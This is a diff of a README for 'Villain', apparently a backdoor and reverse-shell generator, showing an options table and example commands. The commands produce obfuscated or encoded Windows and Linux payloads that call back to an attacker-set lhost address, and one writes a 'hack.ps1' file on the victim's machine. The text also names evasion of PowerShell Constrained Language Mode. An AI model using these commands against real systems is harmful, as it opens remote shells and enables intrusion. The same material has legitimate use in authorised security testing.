@@ -26,12 +26,12 @@ The backdoors are designed to start as new background processes. Currently suppo
 | exec_outfile    | False   | Windows       | Yes                | Provide a file path on the victim to write & execute commands from (instead of using IEX) |
 | constraint_mode | False   | Windows       | No                 | Make the generated payload work on PowerShell Constraint Language Mode. By using this option you sacrifice a bit of the decoding clarity of your shell. |
 
-### Examples:
+#### Examples:
 ```
 # For Windows:
-generate os=windows lhost=eth0 obfuscate
-generate os=windows lhost=192.168.12.36 exec_outfile="C:\Users\\\$env:USERNAME\.local\hack.ps1" encode
+Villain > generate os=windows lhost=eth0 obfuscate
+Villain > generate os=windows lhost=192.168.12.36 exec_outfile="C:\Users\\\$env:USERNAME\.local\hack.ps1" encode
 
 # For Linux:
-generate os=linux lhost=192.168.12.62
+Villain > generate os=linux lhost=192.168.12.62
 ```
